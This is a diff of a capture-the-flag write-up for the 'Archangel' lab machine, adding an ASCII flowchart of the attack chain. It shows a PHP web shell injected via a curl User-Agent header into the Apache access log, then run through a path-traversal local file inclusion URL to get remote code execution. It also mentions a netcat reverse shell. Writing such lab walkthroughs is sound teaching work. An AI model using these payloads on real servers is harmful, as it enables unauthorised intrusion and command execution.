@@ -141,7 +141,7 @@ i also noticed that there is no need for the base64 filter, i did it because it 
 ```bash
 curl -A "<?php system(\$_GET['cmd']); ?>" http://mafialive.thm/
 ```
-we have injected the cmd parameter in the system, now lets test if the RCE is working or not. 
+we have injected the cmd parameter as the User-Agent in the header, now lets test if the RCE is working or not. 
 
 ```bash
 http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=id
@@ -150,7 +150,47 @@ http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//../
 as you can see in the image below we have sucessfully poisoned the logs and achieved RCE via LFI on the machine. lets use a reverseshell and setup a netcat listener in another terminal
 ![image5](https://github.com/realatharva15/archangel_writeup/blob/main/images/logpoisoning.png)
 
+let me summarize the entire attack workflow with a flowchart which DeepSeek made:
+
+```bash
+┌─────────────────────────────────────────────────────────────┐
+│                    YOUR ACTION (Attacker)                    │
+├─────────────────────────────────────────────────────────────┤
+│ curl -A "<?php system($_GET['cmd']); ?>" http://target/     │
+└──────────────────────────────┬──────────────────────────────┘
+                               │
+                               ▼
+┌─────────────────────────────────────────────────────────────┐
+│                    APACHE LOG ENTRY                          │
+├─────────────────────────────────────────────────────────────┤
+│ ... "GET / HTTP/1.1" 200 X "-" "<?php system($_GET['cmd']); ?>" │
+└──────────────────────────────┬──────────────────────────────┘
+                               │ (Log file saved with PHP code)
+                               ▼
+┌─────────────────────────────────────────────────────────────┐
+│                    LFI VULNERABILITY                         │
+├─────────────────────────────────────────────────────────────┤
+│ test.php?view=/var/log/apache2/access.log&cmd=id            │
+└──────────────────────────────┬──────────────────────────────┘
+                               │
+                               ▼
+┌─────────────────────────────────────────────────────────────┐
+│                    PHP INTERPRETATION                        │
+├─────────────────────────────────────────────────────────────┤
+│ 1. include('/var/log/apache2/access.log')                   │
+│ 2. File contains: <?php system($_GET['cmd']); ?>            │
+│ 3. PHP executes: system('id')                               │
+└──────────────────────────────┬──────────────────────────────┘
+                               │
+                               ▼
+┌─────────────────────────────────────────────────────────────┐
+│                    RESULT                                   │
+├─────────────────────────────────────────────────────────────┤
+│ Output: uid=33(www-data) gid=33(www-data) groups=33(www-data) │
+└─────────────────────────────────────────────────────────────┘
+
 # Shell as www-data:
+```
 
 ```bash
 #first setup the netcat listner
